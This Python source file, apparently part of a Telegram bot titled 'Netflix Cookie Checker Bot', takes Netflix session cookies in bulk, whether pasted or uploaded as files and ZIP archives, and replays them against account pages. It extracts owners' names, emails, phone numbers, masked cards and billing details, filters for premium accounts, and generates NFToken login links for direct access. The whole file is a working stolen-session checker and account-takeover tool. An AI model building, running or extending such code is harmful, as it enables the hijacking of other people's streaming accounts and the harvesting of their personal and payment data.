    if not token or mode == "false":
        return []
    if mode == "pc":
        return [("PC Login", f"https://netflix.com/?nftoken={token}")]
    if mode == "mobile":
        return [("Phone Login", f"https://netflix.com/unsupported?nftoken={token}")]
    return [
        ("PC Login", f"https://netflix.com/?nftoken={token}"),
        ("Phone Login", f"https://netflix.com/unsupported?nftoken={token}"),
    ]

def get_account_page(session, proxy=None, timeout=15):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    urls = [
        "https://www.netflix.com/YourAccount",
        "https://www.netflix.com/account/membership",
        "https://www.netflix.com/account/"
    ]
    
    for url in urls:
        try:
            resp = session.get(url, headers=headers, timeout=timeout)
            if resp.status_code == 200:
                info = extract_info(resp.text)
                if has_any_account_info(info):
                    return resp.text, resp.status_code, info
        except:
            continue
    
    resp = session.get(urls[0], headers=headers, timeout=timeout)
    return resp.text, resp.status_code, extract_info(resp.text)


# ==================== RESULT FORMATTING (EXACTLY LIKE SCREENSHOT) ====================

def format_result_like_screenshot(info, is_subscribed, cookie_content, nftoken_data=None):
    """تنسيق النتيجة بنفس شكل الصورة بالضبط"""
    
    _, plan_label = derive_plan_info(info, is_subscribed)
    
    name = decode_netflix_value(info.get("accountOwnerName")) or "Unknown"
    if name.lower() in ['chrome', 'firefox', 'safari', 'edge', 'opera']:
        name = get_name_from_profiles(info)
    
    email = decode_netflix_value(info.get("email")) or "Unknown"
    email = clean_text(email)
    
    country_raw = decode_netflix_value(info.get("countryOfSignup")) or "Unknown"
    country_code = country_raw.upper() if len(country_raw) == 2 else ""
    country = f"{country_raw} ({country_code})" if country_code else country_raw
    
    plan = plan_label
    price = decode_netflix_value(info.get("planPrice")) or "N/A"
    member_since = format_member_since(info.get("memberSince")) or "Unknown"
    next_billing = format_display_date(info.get("nextBillingDate")) or "Unknown"
    payment = extract_payment_method_strong("", info)
    if payment == "Unknown":
        payment = "CC"
    elif payment == "Credit Card":
        payment = "CC"
    
    card = decode_netflix_value(info.get("maskedCard")) or "N/A"
    phone = decode_netflix_value(info.get("phoneNumber")) or "N/A"
    phone_verified = "Yes" if format_boolean_label(info.get("phoneVerified")) == "Yes" else "No"
    quality = decode_netflix_value(info.get("videoQuality")) or "Unknown"
    streams = str(info.get("maxStreams") or "Unknown").rstrip("}")
    hold = "No" if format_boolean_label(info.get("isUserOnHold")) != "Yes" else "Yes"
    extra_member = "Yes" if is_extra_member_account(info) else "No"
    email_verified = "No" if format_boolean_label(info.get("emailVerified")) == "No" else "Yes"
    membership_status = decode_netflix_value(info.get("membershipStatus")) or "UNKNOWN"
    
    profiles_raw = info.get("profiles") or ""
    clean_profiles, _ = clean_profile_names(profiles_raw)
    profiles_count = len(clean_profiles) if clean_profiles else 0
    profiles_display = ", ".join(clean_profiles) if clean_profiles else "None"
    
    lines = []
    lines.append("Status: Valid Premium Account")
    lines.append("")
    lines.append("Account Details:")
    lines.append(f"- Name: {name}")
    lines.append(f"- Email: {email}")
    lines.append(f"- Country: {country}")
    lines.append(f"- Plan: {plan}")
    
    if is_subscribed:
        if price != "N/A":
            lines.append(f"- Price: {price}")
        lines.append(f"- Member Since: {member_since}")
        lines.append(f"- Next Billing: {next_billing}")
        lines.append(f"- Payment: {payment}")
        if card != "N/A":
            lines.append(f"- Card: {card}")
        lines.append(f"- Phone: {phone} ({phone_verified})")
        lines.append(f"- Quality: {quality}")
        lines.append(f"- Streams: {streams}")
        lines.append(f"- Hold Status: {hold}")
        lines.append(f"- Extra Member: {extra_member}")
        if extra_member == "Yes":
            lines.append(f"- Extra Member Slot: Unknown")
        lines.append(f"- Email Verified: {email_verified}")
        lines.append(f"- Membership Status: {membership_status}")
    
    lines.append(f"- Connected Profiles: {profiles_count}")
    lines.append(f"- Profiles: {profiles_display}")
    
    lines.append("")
    lines.append("Cookie:")
    cookie_clean = cookie_content.replace('\n', '')
    cookie_clean = re.sub(r'\s+', ' ', cookie_clean)
    lines.append(cookie_clean)
    
    lines.append("")
    lines.append("Account Filter: Premium Only")
    lines.append("Mode: Full Information")
    
    # NFToken Links
    if nftoken_data and has_usable_nftoken(nftoken_data):
        lines.append("")
        lines.append("NFToken Login Links:")
        lines.append("---")
        lines.append(f"PC Login: https://netflix.com/?nftoken={nftoken_data['token']}")
        lines.append(f"Phone Login: https://netflix.com/unsupported?nftoken={nftoken_data['token']}")
        if nftoken_data.get('expires_at_utc'):
            lines.append(f"Valid Until (UTC): {nftoken_data['expires_at_utc']}")
    
    return "\n".join(lines)


# ==================== PROGRESS BAR FUNCTIONS ====================

def format_progress_message(processed, total, valid_count, premium_count, free_count, invalid_count, speed, eta):
    percentage = (processed / total) * 100 if total > 0 else 0
    filled = int(20 * percentage / 100)
    empty = 20 - filled
    bar = "█" * filled + "░" * empty
    
    message = f"""📦 Processing Progress

Total Cookies: {total}
Mode: Fullinfo
Filter: Premium accounts only

📊 Current Status:
{percentage:.1f}% {bar}

📁 Processing: {processed}/{total}
✅ Valid: {valid_count}
💰 Premium: {premium_count}
🆓 Free: {free_count}
❌ Invalid: {invalid_count}

⚡ Speed: {speed:.1f} acc/s
⏱️ ETA: {eta:.1f}s remaining

⚠️ Use /cancel to stop this task"""
    return message


# ==================== TEXT COOKIE HANDLER ====================

async def handle_text_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الكوكيز المرسلة كنص في الشات - تظهر النتيجة زي الصورة"""
    text = update.message.text
    
    # التحقق من وجود NetflixId في النص (دليل على أنه كوكيز)
    if 'NetflixId' not in text or len(text) < 100:
        return  # مش كوكيز، نتجاهل
    
    status_msg = await update.message.reply_text("🔍 Cookie detected! Processing...")
    
    try:
        # محاولة استخراج الكوكيز من النص
        bundles = extract_netflix_cookie_bundles(text)
        
        if not bundles:
            # محاولة بديلة: البحث المباشر
            import re
            match = re.search(r'NetflixId[=: ]+([^\s]+)', text)
            if match:
                netflix_id = match.group(1)
                cookies = {'NetflixId': netflix_id}
                match2 = re.search(r'SecureNetflixId[=: ]+([^\s]+)', text)
                if match2:
                    cookies['SecureNetflixId'] = match2.group(1)
                bundles = [{"netscape_text": text, "cookies": cookies}]
        
        if not bundles:
            await status_msg.edit_text("❌ No valid Netflix cookies found in the text.")
            return
        
        bundle = bundles[0]
        netscape_content = bundle.get("netscape_text", "")
        cookies = bundle.get("cookies") or cookies_dict_from_netscape(netscape_content)
        
        if not cookies or not has_required_netflix_cookies(cookies):
            await status_msg.edit_text("❌ Invalid cookies - NetflixId required.")
            return
        
        await status_msg.edit_text("🔄 Connecting to Netflix...")
        
        session = requests.Session()
        session.cookies.update(cookies)
        config, _ = load_config()
        
        response_text, status_code, info = get_account_page(session, None, 15)
        
        if status_code == 200 and info and info.get("countryOfSignup"):
            is_subscribed = is_subscribed_account(info)
            
            nftoken_data = None
            nftoken_mode = get_nftoken_mode(config)
            if nftoken_mode != "false" and is_subscribed:
                nftoken_data, _ = create_nftoken(cookies, 1)
            
            # تنسيق النتيجة بنفس شكل الصورة
            result = format_result_like_screenshot(info, is_subscribed, netscape_content, nftoken_data)
            
            await status_msg.delete()
            
            # تقسيم النتيجة إذا كانت طويلة جداً
            if len(result) > 4096:
                for i in range(0, len(result), 4096):
                    await update.message.reply_text(result[i:i+4096])
            else:
                await update.message.reply_text(result)
            
            stats['total'] += 1
            if is_subscribed:
                stats['valid'] += 1
            else:
                stats['free'] += 1
        else:
            await status_msg.edit_text(f"❌ Failed: HTTP {status_code}")
            stats['failed'] += 1
            
    except Exception as e:
        await status_msg.edit_text(f"❌ Error: {str(e)[:100]}")
        stats['failed'] += 1


# ==================== TELEGRAM BOT HANDLERS ====================

async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    first_name = user.first_name if user.first_name else "User"
    
    await update.message.reply_text(f"""
🎬 Netflix Cookie Checker Bot
⚡ Developer: Eyad 🚀

✨ Welcome {first_name}! ✨

📌 WHAT I DO:
   ✅ Verify Netflix cookies
   ✅ Extract full account details

⚙️ HOW TO USE:
   1️⃣ Send cookie files (.txt or .json)
   2️⃣ Or send ZIP archive with multiple cookies
   3️⃣ Or paste cookie text directly in chat
   4️⃣ Get detailed results

🕹️ COMMANDS:
   /start      → Show menu
   /help       → Instructions
   /stats      → Statistics
   /tokenonly  → Token-only mode
   /fullinfo   → Full details mode
   /cancel     → Stop current task

🔽 USE THE MENU BUTTON BELOW FOR COMMANDS
""")

async def bot_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("""
📖 HELP & INSTRUCTIONS

STEP 1: Get Cookies
   Use browser extension "Cookie-Editor":
   - Install from Chrome/Firefox store
   - Log into Netflix
   - Export as JSON (recommended) or Netscape

STEP 2: Send to Bot
   - Send .txt or .json file
   - OR send ZIP with multiple files
   - OR paste cookie text directly in chat

STEP 3: Get Results
   - Full account details (like the screenshot)
   - NFToken login links (PC + Phone)
   - Account statistics

🔽 USE THE MENU BUTTON FOR COMMANDS
""")

async def bot_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"""
📊 BOT STATISTICS

Total processed: {stats['total']}
✅ Valid Premium accounts: {stats['valid']}
🆓 Free accounts: {stats['free']}
❌ Failed/Invalid: {stats['failed']}
🔄 Currently processing: {stats['processing']}

🤖 Bot is running normally
""")

async def bot_tokenonly(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['mode'] = 'tokenonly'
    await update.message.reply_text("🔑 Token Only Mode - ACTIVATED")

async def bot_fullinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['mode'] = 'fullinfo'
    await update.message.reply_text("📋 Full Info Mode - ACTIVATED")

async def bot_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in user_tasks and user_tasks[uid].get('active'):
        user_tasks[uid]['cancel'] = True
        await update.message.reply_text("⏹️ Cancellation requested - Task will stop after current file")
    else:
        await update.message.reply_text("ℹ️ No active task to cancel")

async def handle_single_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stats
    
    uid = update.effective_user.id
    user_tasks[uid] = {'active': True, 'cancel': False}
    doc = update.message.document
    fname = doc.file_name
    start_time = time.time()
    
    if doc.file_size > 5 * 1024 * 1024:
        await update.message.reply_text("❌ File too large! Max 5MB. Use ZIP for larger collections.")
        user_tasks[uid]['active'] = False
        return
    
    file = await doc.get_file()
    data = BytesIO()
    await file.download_to_memory(data)
    content = data.getvalue().decode('utf-8', errors='ignore')
    
    bundles = extract_netflix_cookie_bundles(content)
    
    if not bundles:
        await update.message.reply_text("❌ No valid cookies found in this file.")
        stats['failed'] += 1
        user_tasks[uid]['active'] = False
        return
    
    total_bundles = len(bundles)
    await update.message.reply_text(f"📦 Found {total_bundles} cookie(s) in this file. Starting check...")
    
    status_msg = await update.message.reply_text(f"📥 Processing: {fname}\n\n{format_progress_message(0, total_bundles, 0, 0, 0, 0, 0, 0)}")
    
    results = []
    processed = 0
    valid_count = 0
    free_count = 0
    invalid_count = 0
    
    for idx, bundle in enumerate(bundles, 1):
        if user_tasks[uid].get('cancel', False):
            await status_msg.edit_text("⏹️ Task cancelled by user")
            break
        
        cookies = bundle.get("cookies", {})
        if not cookies or not has_required_netflix_cookies(cookies):
            invalid_count += 1
            processed += 1
            stats['failed'] += 1
            stats['total'] += 1
            continue
        
        session = requests.Session()
        session.cookies.update(cookies)
        response_text, status_code, info = get_account_page(session, None, 15)
        
        if status_code == 200 and info and info.get("countryOfSignup"):
            is_sub = is_subscribed_account(info)
            config, _ = load_config()
            nftoken = None
            if get_nftoken_mode(config) != "false" and is_sub:
                nftoken, _ = create_nftoken(cookies, 1)
            
            result = format_result_like_screenshot(info, is_sub, bundle.get("netscape_text", ""), nftoken)
            results.append(result)
            results.append("\n" + "="*65 + "\n")
            
            if is_sub:
                stats['valid'] += 1
                valid_count += 1
            else:
                stats['free'] += 1
                free_count += 1
        else:
            invalid_count += 1
            stats['failed'] += 1
        
        stats['total'] += 1
        processed += 1
        
        percentage = (processed / total_bundles) * 100
        progress_bar = f"[{'█' * int(20 * percentage / 100)}{'░' * (20 - int(20 * percentage / 100))}] {percentage:.1f}%"
        await status_msg.edit_text(f"📥 Processing: {fname}\n📁 {processed}/{total_bundles}\n\n{progress_bar}\n\n✅ Valid: {valid_count} | 🆓 Free: {free_count} | ❌ Invalid: {invalid_count}")
    
    if not user_tasks[uid].get('cancel', False):
        await status_msg.delete()
        all_results = "\n".join(results)
        if len(all_results) > 4096:
            for i in range(0, len(all_results), 4096):
                await update.message.reply_text(all_results[i:i+4096])
        else:
            await update.message.reply_text(all_results)
    
    user_tasks[uid]['active'] = False

async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stats
    uid = update.effective_user.id
    user_tasks[uid] = {'active': True, 'cancel': False}
    doc = update.message.document
    fname = doc.file_name
    start = time.time()
    
    if doc.file_size > 100 * 1024 * 1024:
        await update.message.reply_text("❌ File too large! Max 100MB")
        user_tasks[uid]['active'] = False
        return
    
    msg = await update.message.reply_text(f"📦 Processing ZIP: {fname}\n\nPlease wait...")
    file = await doc.get_file()
    zip_data = BytesIO()
    await file.download_to_memory(zip_data)
    
    results = []
    valid_count = 0
    free_count = 0
    invalid_count = 0
    total_files = 0
    processed = 0
    
    try:
        with zipfile.ZipFile(zip_data, 'r') as zf:
            files = [f for f in zf.namelist() if f.endswith(('.txt', '.json'))]
            total_files = len(files)
            if not files:
                await msg.edit_text("❌ No cookie files found in ZIP")
                user_tasks[uid]['active'] = False
                return
            
            config, _ = load_config()
            mode = context.user_data.get('mode', 'fullinfo')
            
            for idx, cf in enumerate(files):
                if user_tasks[uid].get('cancel', False):
                    await msg.edit_text("⏹️ Task cancelled by user")
                    break
                
                try:
                    content = zf.read(cf).decode('utf-8', errors='ignore')
                    bundles = extract_netflix_cookie_bundles(content)
                    
                    if not bundles:
                        invalid_count += 1
                        processed += 1
                        stats['failed'] += 1
                        stats['total'] += 1
                        continue
                    
                    for bundle in bundles:
                        cookies = bundle.get("cookies", {})
                        if not cookies or not has_required_netflix_cookies(cookies):
                            invalid_count += 1
                            stats['failed'] += 1
                            stats['total'] += 1
                            continue
                        
                        sess = requests.Session()
                        sess.cookies.update(cookies)
                        response_text, status_code, info = get_account_page(sess, None, 15)
                        
                        if status_code == 200 and info and info.get("countryOfSignup"):
                            is_sub = is_subscribed_account(info)
                            nftoken = None
                            if get_nftoken_mode(config) != "false" and is_sub:
                                nftoken, _ = create_nftoken(cookies, 1)
                            
                            result = format_result_like_screenshot(info, is_sub, bundle.get("netscape_text", ""), nftoken)
                            results.append(result)
                            results.append("\n" + "="*65 + "\n")
                            
                            if is_sub:
                                stats['valid'] += 1
                                valid_count += 1
                            else:
                                stats['free'] += 1
                                free_count += 1
                        else:
                            invalid_count += 1
                            stats['failed'] += 1
                        
                        stats['total'] += 1
                    
                    processed += 1
                    
                    percentage = (processed / total_files) * 100
                    progress_bar = f"[{'█' * int(20 * percentage / 100)}{'░' * (20 - int(20 * percentage / 100))}] {percentage:.1f}%"
                    await msg.edit_text(f"📦 Processing ZIP: {fname}\n📁 {processed}/{total_files}\n\n{progress_bar}\n\n✅ Valid: {valid_count} | 🆓 Free: {free_count} | ❌ Invalid: {invalid_count}")
                    
                except Exception as e:
                    invalid_count += 1
                    processed += 1
                    print(f"Error: {e}")
        
        if not user_tasks[uid].get('cancel', False):
            elapsed = time.time() - start
            spd = total_files / elapsed if elapsed > 0 else 0
            
            final = f"""
✅ Processing Complete

Final Statistics:
----------------------------------------------------
Total Files: {total_files}

Valid Accounts: {valid_count}
Premium Accounts: {valid_count}
Free Accounts: {free_count}
Invalid Accounts: {invalid_count}

Time Taken: {elapsed:.2f} seconds
Speed: {spd:.2f} files/second
----------------------------------------------------
"""
            await msg.delete()
            await update.message.reply_text(final)
            
            if results:
                all_results = "\n".join(results)
                if len(all_results) > 4096:
                    for i in range(0, len(all_results), 4096):
                        await update.message.reply_text(all_results[i:i+4096])
                else:
                    await update.message.reply_text(all_results)
            else:
                await update.message.reply_text("⚠️ No valid accounts found in this ZIP file.")
            
    except Exception as e:
        await msg.edit_text(f"❌ Error: {str(e)[:200]}")
    finally:
        user_tasks[uid]['active'] = False

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    fname = update.message.document.file_name.lower()
    if fname.endswith('.zip'):
        await handle_zip_file(update, context)
    elif fname.endswith('.txt') or fname.endswith('.json'):
        await handle_single_file(update, context)
    else:
        await update.message.reply_text("❌ Send .txt, .json, or .zip files")

async def set_commands(app):
    await app.bot.set_my_commands([
        BotCommand("start", "Show menu"),
        BotCommand("help", "Instructions"),
        BotCommand("stats", "Statistics"),
        BotCommand("tokenonly", "Token only mode"),
        BotCommand("fullinfo", "Full details mode"),
        BotCommand("cancel", "Stop task"),
    ])


# ==================== MAIN ====================

def main():
    create_base_folders()
    print("\n" + "="*50)
    print("Netflix Cookie Checker Bot")
    print("="*50)
    print("Bot is starting...")
    print("="*50)
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", bot_start))
    app.add_handler(CommandHandler("help", bot_help))
    app.add_handler(CommandHandler("stats", bot_stats))
    app.add_handler(CommandHandler("tokenonly", bot_tokenonly))
    app.add_handler(CommandHandler("fullinfo", bot_fullinfo))
    app.add_handler(CommandHandler("cancel", bot_cancel))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_cookie))
    
    import asyncio
    try:
        asyncio.get_event_loop().run_until_complete(set_commands(app)))
    except:
        pass
    
    print("Bot is ready! Send /start on Telegram")
    print("Press Ctrl+C to stop\n")
    app.run_polling()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nBot stopped")
